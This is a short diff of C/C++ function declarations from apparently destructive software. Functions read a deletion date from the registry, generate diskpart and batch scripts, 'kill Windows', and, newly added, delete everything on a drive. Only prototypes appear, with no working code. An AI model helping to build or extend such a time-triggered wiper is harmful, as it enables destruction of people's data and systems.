@@ -40,8 +40,8 @@ bool IfDeleteDiskD();
 bool IfKillWindows();
 bool ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month);
 void GetCurrentDay(int& DelDay, int& DelDayOfWeek, int& Month);
-bool CreateDiskpartScript(wchar_t szFileDiskPart[], wchar_t szTempPath[], wchar_t szFilePath[]);
+bool CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[]);
 bool CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[]);
+bool DeleteAllOnDrive(char szDriveLetter[]);
 void DoKillWindows();
 int stringSizeInBytes(CString strToCalc);
-
